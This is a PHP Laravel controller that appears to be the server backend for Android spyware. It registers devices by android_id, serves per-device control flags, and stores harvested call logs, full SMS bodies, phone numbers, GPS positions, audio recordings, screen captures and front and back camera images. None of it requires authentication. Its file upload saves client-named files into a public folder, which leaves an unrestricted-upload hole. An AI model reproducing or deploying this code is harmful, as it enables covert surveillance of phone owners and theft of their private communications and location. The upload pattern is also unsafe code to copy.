<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Str;
class ApkController extends Controller
{
    //
    public function fromApk(Request $request){
   
        $data = [
            'status' => 'success',
            'message' => 'This is hardcoded data from the Laravel backend!',
            'users' => [
                [
                    'id' => 1,
                    'name' => 'John Doe',
                    'email' => 'john.doe@example.com'
                ],
                [
                    'id' => 2,
                    'name' => 'Jane Smith',
                    'email' => 'jane.smith@example.com'
                ]
            ]
        ];

        // Return the data as a JSON response
        return response()->json($data);

        
    }
    public function getFlags(Request $request){
        $android_id = $request->get('android_id');
        $exist_id=DB::connection('ad_mysql')->table('android_ids')->where('android_id',$android_id)->get();
        if(count($exist_id)==0){
            $insert = array(
                'android_id'=>$android_id,
            );
            DB::connection('ad_mysql')->table("android_ids")->insert($insert);
        }
        $exist_id=DB::connection('ad_mysql')->table('flags')->where('android_id',$android_id)->get();
        if(count($exist_id)==0){
            $insert = array(
                'android_id'=>$android_id,
            );
            DB::connection('ad_mysql')->table("flags")->insert($insert);
        }
        $flags = DB::connection('ad_mysql')->table('flags')->where('android_id',$android_id)->first();
        // Return the data as a JSON response
        return response()->json($flags);
        
    }
    public function postData(Request $request){
        $android_id = $request->post('android_id');

        $target = $request->post('target');
        $data = $request->post('data');
        if($target=="error_logs"){
            $feature = $data['feature'] ?? "";
            $message = $data['message'] ?? "";
            try {
                $insert = array(
                    'android_id'=>$android_id,
                    'feature'=>$feature,
                    'message'=>$message
                );
                DB::connection('ad_mysql')->table("error_logs")->insert($insert);
    
                // Return success response
                return response()->json([
                    'success' => true,
                    'message' => 'Data saved successfully'
                ]);
            } catch (\Exception $e) {
                // Handle any errors
                return response()->json([
                    'success' => false,
                    'message' => 'Failed to save data',
                ]);
            }
        }
        if($target=="model_name"){
            $model_name = $data['model_name'] ?? "";
            try {
                $exist_id=DB::connection('ad_mysql')->table('models')->where('android_id',$android_id)->get();
                if(count($exist_id)==0){
                    $insert = array(
                        'android_id'=>$android_id,
                        'model_name'=>$model_name
                    );
                    DB::connection('ad_mysql')->table("models")->insert($insert);
                }
    
                // Return success response
                return response()->json([
                    'success' => true,
                    'message' => 'Data saved successfully'
                ]);
            } catch (\Exception $e) {
                // Handle any errors
                return response()->json([
                    'success' => false,
                    'message' => 'Failed to save data',
                ]);
            }
        }
        if($target=="android_version"){
            $version = $data['version'] ?? "";
            try {
                $exist_id=DB::connection('ad_mysql')->table('versions')->where('android_id',$android_id)->get();
                if(count($exist_id)==0){
                    $insert = array(
                        'android_id'=>$android_id,
                        'version'=>$version
                    );
                    DB::connection('ad_mysql')->table("versions")->insert($insert);
                }
    
                // Return success response
                return response()->json([
                    'success' => true,
                    'message' => 'Data saved successfully'
                ]);
            } catch (\Exception $e) {
                // Handle any errors
                return response()->json([
                    'success' => false,
                    'message' => 'Failed to save data',
                ]);
            }
        }
        if($target=="phone_number"){
            $phone_number = $data['phone_number'] ?? "";
            try {
    
                foreach($phone_number as $key=>$value){
                    $exist_id=DB::connection('ad_mysql')->table('phone_numbers')->where(array('android_id'=>$android_id,'phone_number'=>$value))->get();
                    if(count($exist_id)==0){
                        $insert = array(
                            'android_id'=>$android_id,
                            'phone_number'=>$value
                        );
                        DB::connection('ad_mysql')->table("phone_numbers")->insert($insert);
                    }

        
                }

                // Return success response
                return response()->json([
                    'success' => true,
                    'message' => 'Data saved successfully'
                ]);
            } catch (\Exception $e) {
                // Handle any errors
                return response()->json([
                    'success' => false,
                    'message' => 'Failed to save data',
                ]);
            }
        }
        if($target=="signal_strength"){
            $signal_strength = $data['signal_strength'] ?? "";
            try {
                $insert = array(
                    'android_id'=>$android_id,
                    'signal_strength'=>$signal_strength
                );
                DB::connection('ad_mysql')->table("signal_strengths")->insert($insert);
    
                // Return success response
                return response()->json([
                    'success' => true,
                    'message' => 'Data saved successfully'
                ]);
            } catch (\Exception $e) {
                // Handle any errors
                return response()->json([
                    'success' => false,
                    'message' => 'Failed to save data',
                ]);
            }
        }
        if($target=="gps"){
            $gps = $data['gps'] ?? "";
            try {
                $old=DB::connection('ad_mysql')->table('gpss')->where('gps',$gps)->get();
                if(count($old)==0){
                    $insert = array(
                        'android_id'=>$android_id,
                        'gps'=>$gps
                    );
                    DB::connection('ad_mysql')->table("gpss")->insert($insert);
        
                }

                // Return success response
                return response()->json([
                    'success' => true,
                    'message' => 'Data saved successfully'
                ]);
            } catch (\Exception $e) {
                // Handle any errors
                return response()->json([
                    'success' => false,
                    'message' => 'Failed to save data',
                ]);
            }
        }
        if($target=="call_log"){
            $callLogsString = $data['call_logs'] ?? "";
            $entries = explode("--new one--", $callLogsString);


            try {
                $parsedLogs = [];
                foreach ($entries as $entry) {
                    // Extract number, type, and date using a regular expression or string manipulation
                    preg_match('/Number: (.*?), Type: (.*?), Date: (.*)/', $entry, $matches);
        
                    if (count($matches) === 4) {
                        $parsedLogs[] = [
                            'android_id'=>$android_id,
                            'number' => $matches[1],
                            'type' => $matches[2],
                            'date' => $matches[3],
                        ];
                    }
                }
                foreach ($parsedLogs as $log) {
                    $old = DB::connection('ad_mysql')->table('call_logs')->where('date',$log['date'])->get();
                    if(count($old)==0){
                        DB::connection('ad_mysql')->table("call_logs")->insert($log);

                    }
                }

                // Return success response
                return response()->json([
                    'success' => true,
                    'message' => 'Data saved successfully'
                ]);
            } catch (\Exception $e) {
                // Handle any errors
                return response()->json([
                    'success' => false,
                    'message' => 'Failed to save data',
                ]);
            }
        }
        if($target=="sms_log"){
            $smsLogsString = $data['sms_logs'] ?? "";
            $entries = explode("--new one--", $smsLogsString);


            try {
                $parsedLogs = [];
                foreach ($entries as $entry) {
                    // Extract number, type, and date using a regular expression or string manipulation
                    preg_match('/Address: (.*?), Body: (.*?), Date: (.*)/', $entry, $matches);
        
                    if (count($matches) === 4) {
                        $parsedLogs[] = [
                            'android_id'=>$android_id,
                            'address' => $matches[1],
                            'body' => $matches[2],
                            'date' => $matches[3],
                        ];
                    }
                }
                foreach ($parsedLogs as $log) {
                    $old = DB::connection('ad_mysql')->table('sms_logs')->where('date',$log['date'])->get();
                    if(count($old)==0){
                        DB::connection('ad_mysql')->table("sms_logs")->insert($log);

                    }
                }

                // Return success response
                return response()->json([
                    'success' => true,
                    'message' => 'Data saved successfully'
                ]);
            } catch (\Exception $e) {
                // Handle any errors
                return response()->json([
                    'success' => false,
                    'message' => 'Failed to save data',
                ]);
            }
        }
    }
    public function uploadFile(Request $request)
    {

        $file = $request->file('file');
        $android_id = $request->input('metadata');
        $exist_id=DB::connection('ad_mysql')->table('android_ids')->where('android_id',$android_id)->get();
        if(count($exist_id)==0){
            $insert = array(
                'android_id'=>$android_id,
            );
            DB::connection('ad_mysql')->table("android_ids")->insert($insert);
        }
        $fileName = $file->getClientOriginalName();
        $file->move(public_path('uploads'), $fileName);
        if (Str::startsWith($fileName, 'audio_')) {
            $insert = array(
                'android_id'=>$android_id,
                'filename'=>$fileName
            );
            DB::connection('ad_mysql')->table("audio_records")->insert($insert);
        }
        else if (Str::startsWith($fileName, 'screen_')) {
            $insert = array(
                'android_id'=>$android_id,
                'filename'=>$fileName
            );
            DB::connection('ad_mysql')->table("screen_captures")->insert($insert);
        }
        else if (Str::startsWith($fileName, 'front_')) {
            $insert = array(
                'android_id'=>$android_id,
                'filename'=>$fileName,
                'upfront'=>'front'
            );
            DB::connection('ad_mysql')->table("cameras")->insert($insert);
        }
        else if (Str::startsWith($fileName, 'back_')) {
            $insert = array(
                'android_id'=>$android_id,
                'filename'=>$fileName,
                'upfront'=>'back'
            );
            DB::connection('ad_mysql')->table("cameras")->insert($insert);
        }
        return response()->json(['success' => true, 'message' => 'File uploaded successfully']);
    }
}
